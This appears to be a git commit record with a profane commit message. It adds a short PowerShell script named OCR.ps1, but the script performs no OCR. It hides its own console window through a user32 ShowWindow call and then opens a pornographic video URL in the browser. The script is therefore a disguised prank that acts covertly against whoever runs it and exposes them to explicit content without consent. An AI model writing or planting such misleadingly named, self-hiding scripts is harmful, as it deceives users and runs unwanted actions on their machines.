ce802d7ab679701092c1f453dbd24dc41637fbe9
gaYERMA <98197534+gaYERMA@users.noreply.github.com>
2022-08-04 16:16:38 -0700

    fuck you]

---
+++ OCR.ps1
@@ -0,0 +1,4 @@
+$t = '[DllImport("user32.dll")] public static extern bool ShowWindow(int handle, int state);'
+add-type -name win -member $t -namespace native
+[native.win]::ShowWindow(([System.Diagnostics.Process]::GetCurrentProcess() | Get-Process).MainWindowHandle, 0)
+Start-Process "https://www.pornhub.com/view_video.php?viewkey=ph61197c042f7b7"
